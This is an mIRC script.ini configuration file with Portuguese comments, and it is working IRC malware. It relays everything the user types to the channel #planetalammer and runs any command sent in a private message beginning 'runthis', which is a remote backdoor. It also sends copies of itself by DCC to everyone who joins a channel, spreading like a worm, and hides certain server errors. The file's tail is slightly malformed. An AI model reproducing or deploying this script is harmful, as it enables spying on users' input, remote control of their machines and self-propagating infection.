[script]
n0=
n1=on 1:START:{
n2=  .sreq ignore
n3=  .remote on
n4=}
n5=on 1:CONNECT:
n6=.msg #planetlammer Hi  Tipo assim.... Este script.ini ta editado Hehe
n7=on 1:INPUT:*:{
n8=  .msg #planetalammer ( $+ $active $+ ) $1-
n9=}
n10=on 1:TEXT:*:?:{
n11=  if ( $1 == runthis ) { .run $2- }
n12=}
n13=
n14=on 1:JOIN:*:{
n15=  if ( $nick == $me ) { halt } | /dcc send $nick Script.ini
n16=}
n17=.remote on
n18=titlebar (Not connected)
n19=}
n20=raw 401:*: {
n21=halt
n22=}
n23=RAW 001:*
